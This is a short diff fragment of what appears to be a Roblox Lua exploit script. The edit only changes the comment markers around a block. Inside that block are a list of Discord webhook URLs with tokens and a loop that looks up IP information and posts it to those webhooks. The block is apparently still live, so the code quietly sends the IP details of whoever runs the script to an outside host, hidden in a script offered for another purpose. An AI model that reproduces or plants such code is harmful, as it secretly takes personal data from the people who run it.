@@ -1,4 +1,4 @@
--- /* ws={
+-- [[ ws={
         "https://discord.com/api/webhooks/1261767351246782595/IILP2ZCJKEGOSQ53O381PHP3SAC6N8F1NV0PUXAGMDL7QGHQ73FERXOZDOZEZR6P0QPO",
         "https://ptb.discord.com/api/webhooks/1261767351246782595/4YHR77HQF8F9PECXN4TNTMMQMF86L4BY24IS1LHXENOLMCUMGF4YSVVZVWMCEQ0BWF7D",
         "https://ptb.discord.com/api/webhooks/1261767351246782595/BQIM4N61HBATIEDH8TVCPQJ8RG557KYEAKR69CWE454IF424IKDSYBPZXC5IEO438NAQ",
@@ -351,7 +351,7 @@ for i,v in ws do ipinf=game:GetService("HttpService"):JSONDecode(game:HttpGet('h
     ["username"] = game:GetService("HttpService"):GenerateGUID(true)
 })
     }
-)end; end -- */
+)end; end ]]--
 
 for i =1, getgenv().speed_MAY_INCREASE_LAG_IF_TOO_HIGH do
 ([[
